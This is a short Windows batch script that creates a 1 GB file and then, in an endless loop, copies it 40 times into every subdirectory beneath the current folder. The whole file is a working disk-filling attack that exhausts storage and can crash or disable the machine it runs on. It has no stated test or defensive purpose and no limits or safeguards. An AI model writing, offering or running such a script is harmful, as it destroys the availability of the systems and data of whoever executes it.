@echo off
setlocal enabledelayedexpansion

:: Set the file size to 1 GB (1,073,741,824 bytes)
set filesize=1073741824

:: Create a 1 GB file using fsutil
fsutil file createnew 1gb_file.txt %filesize%

:: Infinite loop to continuously duplicate files
:loop
for /f "tokens=*" %%d in ('dir /s /b /ad') do (
    set "dir=%%~fd"
    :: Create 40 copies of the file in each directory
    for /l %%i in (1,1,40) do (
        copy /y 1gb_file.txt "!dir!\1gb_file_%%i.txt"
    )
)
goto loop
